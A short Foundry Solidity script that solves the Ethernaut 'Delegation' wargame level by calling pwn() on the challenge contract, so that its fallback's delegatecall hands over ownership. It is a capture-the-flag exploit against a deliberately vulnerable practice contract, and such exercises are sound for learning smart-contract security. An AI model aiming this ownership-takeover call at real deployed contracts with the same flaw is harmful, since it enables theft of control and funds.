// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/06_Delegation.sol";

contract ExploitScript is Script {

    Delegation public level06 = Delegation(payable(0x0Ef015B2A388B69B0398D6775846b6a15842ef12));

    function run() external {
        vm.startBroadcast();
        
        address(level06).call(abi.encodeWithSignature("pwn()"));

        vm.stopBroadcast();
    }
}